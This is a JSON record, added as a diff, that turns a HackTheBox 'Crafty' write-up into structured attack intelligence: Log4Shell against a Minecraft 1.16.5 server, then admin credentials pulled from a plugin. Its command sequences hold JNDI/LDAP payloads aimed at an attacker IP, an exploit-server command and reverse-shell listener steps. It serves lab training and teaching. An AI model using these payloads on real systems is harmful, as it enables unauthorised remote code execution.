@@ -1,0 +1,724 @@
+{
+  "writeup_id": "Htb_Crafty",
+  "scenario_fingerprint": {
+    "scenario_name": "minecraft_log4shell_exploitation",
+    "primary_services": [
+      "minecraft",
+      "http"
+    ],
+    "port_signature": "80+25565",
+    "service_combination": "iis+minecraft",
+    "os_family": "windows_server",
+    "environment_type": "gaming_server",
+    "entry_vector": "log4shell_rce",
+    "privilege_path": "service_account_to_admin",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "minecraft_1.16.5_vulnerable",
+      "log4j_exploitation",
+      "java_application_server"
+    ],
+    "environmental_clues": [
+      "minecraft_protocol_127",
+      "iis_10_static_site",
+      "crafty_server_banner"
+    ],
+    "similar_scenarios": [
+      "java_application_log4shell",
+      "gaming_server_exploits"
+    ],
+    "unique_aspects": [
+      "minecraft_command_line_client",
+      "plugin_password_extraction",
+      "gaming_service_context"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Log4Shell_via_Minecraft",
+        "success_reason": "Minecraft server 1.16.5 vulnerable to Log4Shell with unpatched Log4J library",
+        "prerequisite_indicators": [
+          "minecraft_server_accessible",
+          "version_1.12_to_1.16.5",
+          "log4j_library_present",
+          "chat_functionality_enabled"
+        ],
+        "recognition_patterns": [
+          "nmap shows minecraft service",
+          "version 1.16.5 in banner",
+          "free minecraft client can connect",
+          "chat commands accepted"
+        ],
+        "failure_modes": [
+          "patched_log4j_version",
+          "startup_flags_prevent_jndi",
+          "chat_disabled",
+          "version_1.17_or_higher"
+        ],
+        "environmental_factors": [
+          "default_minecraft_installation",
+          "no_security_patches_applied",
+          "java_environment_allows_jndi",
+          "outbound_connections_allowed"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Password_Discovery_via_Plugin_Reverse_Engineering",
+        "success_reason": "Minecraft plugin contained hardcoded administrator credentials",
+        "prerequisite_indicators": [
+          "minecraft_server_directory_accessible",
+          "custom_plugins_present",
+          "java_jar_files_in_plugins",
+          "decompilation_tools_available"
+        ],
+        "recognition_patterns": [
+          "plugins folder contains .jar files",
+          "custom plugin names (not standard)",
+          "small file sizes indicate simple plugins",
+          "hardcoded strings in decompiled code"
+        ],
+        "failure_modes": [
+          "obfuscated_plugin_code",
+          "encrypted_credentials",
+          "no_custom_plugins",
+          "complex_authentication_mechanisms"
+        ],
+        "environmental_factors": [
+          "developer_shortcuts_in_plugins",
+          "testing_credentials_left_in_code",
+          "insufficient_code_review",
+          "simple_plugin_architecture"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Minecraft server version 1.16.5",
+        "discovery_method": "nmap service detection and banner grabbing",
+        "why_critical": "Version 1.16.5 is vulnerable to Log4Shell without patches",
+        "how_to_recognize": [
+          "nmap shows minecraft service with version",
+          "version range 1.12-1.16.5 is vulnerable",
+          "no patching indicators in startup"
+        ],
+        "follow_up_actions": [
+          "setup_minecraft_client",
+          "prepare_log4shell_payload",
+          "test_jndi_callback"
+        ]
+      },
+      {
+        "discovery": "Custom Minecraft plugin with hardcoded credentials",
+        "discovery_method": "File system enumeration and JAR decompilation",
+        "why_critical": "Plugin contained administrator password for privilege escalation",
+        "how_to_recognize": [
+          "custom .jar files in plugins directory",
+          "small file sizes suggest simple plugins",
+          "decompilation reveals hardcoded strings"
+        ],
+        "follow_up_actions": [
+          "decompile_jar_files",
+          "search_for_credential_patterns",
+          "test_discovered_credentials"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "service_account",
+        "escalation_method": "hardcoded_admin_credentials",
+        "why_possible": "Custom plugin contained administrator password in plaintext",
+        "recognition_signs": [
+          "custom_minecraft_plugins_present",
+          "decompilable_jar_files",
+          "hardcoded_authentication_strings",
+          "admin_user_references_in_code"
+        ],
+        "exploitation_path": "Log4Shell → File System Access → Plugin Analysis → Credential Discovery → Administrator Access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80 and 25565 open on Windows host",
+        "decision": "Identify Minecraft service and test for Log4Shell vulnerability",
+        "reasoning": "Port 25565 is Minecraft default, version 1.16.5 is vulnerable to Log4Shell",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if minecraft exploitation fails"
+          },
+          {
+            "option": "service_fingerprinting",
+            "when": "if version unclear"
+          }
+        ],
+        "success_indicators": [
+          "minecraft_version_1.12_to_1.16.5",
+          "ldap_connection_received",
+          "jndi_lookup_triggered"
+        ],
+        "next_decision": "setup_log4shell_exploit"
+      },
+      {
+        "step": 2,
+        "situation": "Confirmed Log4Shell vulnerability via LDAP callback",
+        "decision": "Deploy full Log4Shell exploit with reverse shell payload",
+        "reasoning": "POC confirmed vulnerability, now escalate to RCE",
+        "confidence": 0.9,
+        "prerequisites": [
+          "minecraft_client_access",
+          "ldap_callback_confirmed"
+        ],
+        "success_indicators": [
+          "reverse_shell_connection",
+          "command_execution"
+        ],
+        "failure_fallbacks": [
+          "alternative_payloads",
+          "different_exploit_tools"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Obtained shell as svc_minecraft service account",
+        "decision": "Enumerate Minecraft server files and plugins for credentials",
+        "reasoning": "Service accounts often have access to application configs with hardcoded credentials",
+        "confidence": 0.8,
+        "prerequisites": [
+          "shell_access_obtained"
+        ],
+        "success_indicators": [
+          "minecraft_plugins_found",
+          "config_files_discovered",
+          "credentials_extracted"
+        ],
+        "failure_fallbacks": [
+          "system_enumeration",
+          "privilege_escalation_tools"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_minecraft_detected": {
+        "action": "test_log4shell_immediately",
+        "tools": [
+          "minecraft_console_client",
+          "netcat"
+        ],
+        "payload": "${jndi:ldap://attacker_ip/test}",
+        "next_phase": "exploit_development"
+      },
+      "if_log4shell_confirmed": {
+        "action": "deploy_rce_exploit",
+        "tools": [
+          "log4j-shell-poc",
+          "reverse_shell_payload"
+        ],
+        "next_phase": "post_exploitation_enumeration"
+      },
+      "if_service_account_shell": {
+        "action": "enumerate_application_files",
+        "focus": [
+          "minecraft_plugins",
+          "config_files",
+          "jar_files"
+        ],
+        "tools": [
+          "reverse_engineering",
+          "string_analysis"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_log4shell_on_minecraft_1.12_to_1.16.5",
+        "reasoning": "extremely_high_success_rate_for_these_versions",
+        "applicability": "minecraft_servers_vulnerable_versions"
+      },
+      {
+        "rule": "prioritize_application_specific_enumeration_over_generic",
+        "reasoning": "service_accounts_typically_have_application_access_not_system",
+        "applicability": "service_account_shells"
+      },
+      {
+        "rule": "examine_jar_files_for_hardcoded_credentials",
+        "reasoning": "java_applications_often_contain_embedded_secrets",
+        "applicability": "java_application_environments"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Log4Shell",
+        "mitre_id": "T1190",
+        "required_services": [
+          "minecraft",
+          "java"
+        ],
+        "required_ports": [
+          25565
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "minecraft_server_running",
+          "log4j_vulnerable_version",
+          "java_application_logging_user_input"
+        ],
+        "success_indicators": [
+          "minecraft_version_1.16.5_or_vulnerable",
+          "jndi_lookup_processed",
+          "ldap_callback_received"
+        ],
+        "incompatible_with": [
+          "log4j_patched",
+          "jndi_lookup_disabled",
+          "network_egress_blocked"
+        ],
+        "confidence_boosters": [
+          "minecraft_server_banner",
+          "java_service_detected",
+          "vulnerable_version_confirmed"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Directory_Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_disabled",
+          "predictable_file_structure"
+        ],
+        "success_indicators": [
+          "200_status_responses",
+          "different_content_lengths",
+          "redirect_responses"
+        ],
+        "incompatible_with": [
+          "waf_blocking_requests",
+          "rate_limiting_aggressive",
+          "custom_404_handling"
+        ],
+        "confidence_boosters": [
+          "standard_web_directories_found",
+          "static_content_detected",
+          "common_cms_patterns"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "minecraft_server": {
+        "port_indicators": [
+          25565
+        ],
+        "service_indicators": [
+          "minecraft"
+        ],
+        "banner_indicators": [
+          "Minecraft",
+          "Crafty Server",
+          "Protocol:"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "iis_webserver": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows Server"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "java_application": {
+        "port_indicators": [
+          8080,
+          8443,
+          25565
+        ],
+        "service_indicators": [
+          "minecraft",
+          "tomcat",
+          "jetty"
+        ],
+        "technology_indicators": [
+          "java",
+          "log4j"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "log4shell",
+          "when": "minecraft_server_detected",
+          "reason": "extremely_high_success_rate_rce_likely"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "iis_webserver_detected",
+          "reason": "may_reveal_hidden_content_or_configs"
+        },
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_redirect_detected",
+          "reason": "additional_attack_surface_possible"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "minecraft_protocol_fuzzing",
+          "when": "minecraft_server_detected",
+          "reason": "manual_enumeration_limited_success"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Log4Shell Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "Minecraft-Console-Client",
+            "command_template": "./MinecraftClient-20240415-263-linux-x64 {username}",
+            "actual_command": "./MinecraftClient-20240415-263-linux-x64 0xdf",
+            "output_pattern": "Server version : 1.16.5 (protocol v754)",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "log4j-shell-poc",
+            "command_template": "python poc.py --userip {attacker_ip} --webport {web_port} --lport {shell_port}",
+            "actual_command": "python poc.py --userip 10.10.14.6 --webport 8000 --lport 443",
+            "success_factors": [
+              "vulnerable_log4j_version",
+              "java_deserialization_enabled",
+              "network_connectivity"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "netcat",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 389",
+            "purpose": "vulnerability_verification",
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "minecraft_server_accessible",
+          "log4j_version_1.12_to_1.16.5",
+          "chat_functionality_enabled",
+          "java_deserialization_allowed"
+        ],
+        "success_indicators": [
+          "ldap_connection_received",
+          "exploit_class_downloaded",
+          "reverse_shell_established"
+        ],
+        "common_failures": [
+          "patched_log4j_version",
+          "network_filtering",
+          "java_security_manager_blocking_execution",
+          "incorrect_payload_format"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Minecraft Server Reconnaissance",
+        "mitre_id": "T1046",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "nmap",
+            "command_template": "nmap -p {port} -sCV {target}",
+            "actual_command": "nmap -p 25565 -sCV 10.10.11.249",
+            "output_pattern": "minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "manual_protocol_test",
+            "command_template": "echo -ne \"\\xfe\\x01\" | nc {target} {port}",
+            "actual_command": "echo -ne \"\\xfe\\x01\" | nc crafty.htb 25565",
+            "output_pattern": "version_string_response",
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "minecraft_port_accessible",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "version_information_obtained",
+          "server_status_retrieved",
+          "vulnerability_assessment_possible"
+        ],
+        "common_failures": [
+          "port_filtered",
+          "non_standard_minecraft_implementation",
+          "connection_timeout"
+        ],
+        "follow_up_techniques": [
+          "log4shell_exploitation",
+          "minecraft_client_connection",
+          "version_specific_exploit_research"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "Minecraft-Console-Client",
+        "use_case": "minecraft_server_interaction",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "minecraft_server_exploitation"
+        ],
+        "alternatives": [
+          "official_minecraft_client",
+          "custom_protocol_implementation"
+        ],
+        "best_practices": [
+          "use_offline_mode_for_testing",
+          "test_chat_functionality_first",
+          "monitor_server_responses_for_errors"
+        ]
+      },
+      {
+        "tool": "log4j-shell-poc",
+        "use_case": "log4shell_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "log4j_vulnerability_exploitation"
+        ],
+        "alternatives": [
+          "ysoserial",
+          "custom_ldap_server",
+          "marshalsec"
+        ],
+        "best_practices": [
+          "use_specific_java_version_jdk_8u20",
+          "test_ldap_connectivity_first",
+          "modify_payload_for_windows_targets"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "log4shell_minecraft_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p 25565 -sCV 10.10.11.249",
+            "purpose": "Identify Minecraft version",
+            "expected_output": "Minecraft 1.16.5 detected"
+          },
+          {
+            "step": 2,
+            "command": "./MinecraftClient-20240415-263-linux-x64 0xdf",
+            "purpose": "Connect to Minecraft server",
+            "expected_output": "Successfully joined server"
+          },
+          {
+            "step": 3,
+            "command": "nc -lnvp 389",
+            "purpose": "Test LDAP connectivity",
+            "expected_output": "Connection received from target"
+          },
+          {
+            "step": 4,
+            "command": "${jndi:ldap://10.10.14.6/test}",
+            "purpose": "Verify Log4Shell vulnerability",
+            "expected_output": "LDAP connection attempt"
+          },
+          {
+            "step": 5,
+            "command": "python poc.py --userip 10.10.14.6 --webport 8000 --lport 443",
+            "purpose": "Setup Log4Shell exploit server",
+            "expected_output": "LDAP server listening on 1389"
+          },
+          {
+            "step": 6,
+            "command": "${jndi:ldap://10.10.14.6:1389/a}",
+            "purpose": "Execute Log4Shell payload",
+            "expected_output": "Reverse shell connection"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "minecraft_vulnerability_verification",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo -ne \"\\xfe\\x01\" | nc crafty.htb 25565",
+            "purpose": "Manual protocol test",
+            "expected_output": "Server version string"
+          },
+          {
+            "step": 2,
+            "command": "nc -lnvp 389",
+            "purpose": "Setup LDAP listener",
+            "expected_output": "Listening on port 389"
+          },
+          {
+            "step": 3,
+            "command": "${jndi:ldap://10.10.14.6/test}",
+            "purpose": "Send test payload via Minecraft chat",
+            "expected_output": "LDAP connection received"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Crafty",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2024-02-10",
+      "author": "TheCyberGeek, felamos",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "log4shell",
+        "minecraft_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "log4j_rce",
+        "hardcoded_credentials"
+      ],
+      "environment_type": "gaming_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "log4shell_exploitation",
+        "minecraft_security",
+        "plugin_analysis"
+      ],
+      "prerequisite_knowledge": [
+        "basic_java_concepts",
+        "log4j_fundamentals",
+        "minecraft_basics"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "log4j_exploitation",
+        "gaming_platforms",
+        "credential_harvesting"
+      ],
+      "attack_types": [
+        "remote_code_execution",
+        "credential_access"
+      ],
+      "defensive_lessons": [
+        "update_log4j",
+        "secure_plugin_development",
+        "credential_management"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Unified",
+        "Horizontall",
+        "Backdoor"
+      ],
+      "similarity_reasons": [
+        "log4shell_vulnerability",
+        "java_applications",
+        "service_exploitation"
+      ],
+      "unique_aspects": [
+        "minecraft_server_exploitation",
+        "plugin_reverse_engineering",
+        "gaming_context"
+      ],
+      "difficulty_factors": [
+        "well_known_vulnerability",
+        "straightforward_exploitation",
+        "clear_attack_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T18:27:05.250751",
+    "original_file": "0xdf_writeups/Htb Crafty.md",
+    "content_length": 32682,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
